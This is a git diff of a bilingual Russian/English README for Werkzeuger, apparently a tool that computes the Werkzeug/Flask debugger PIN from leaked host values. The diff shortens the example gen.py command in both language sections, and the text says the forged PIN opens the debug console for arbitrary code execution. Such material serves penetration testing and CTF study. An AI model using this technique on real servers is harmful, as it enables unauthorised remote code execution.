@@ -38,7 +38,7 @@ appname: Flask
 Самостоятельная генерация пина:
 ![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/gen.png)
 
-```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope --modname flask.app --appname Flask```
+```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope```
 
 Пин, который мы сгенерировали совпадает с пином разработчика, а это значит, что теперь мы можем войти в отладочную коносль и выполнить произвольный код 
 ![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/console.png)
@@ -94,7 +94,7 @@ Original pin (only visible to the developer):
 Self-generated pin:
 ![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/gen.png)
 
-```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope --modname flask.app --appname Flask```
+```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope```
 
 The pin we generated is the same as the developer pin, which means that we can now enter the debug console and execute arbitrary code
 ![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/console.png)
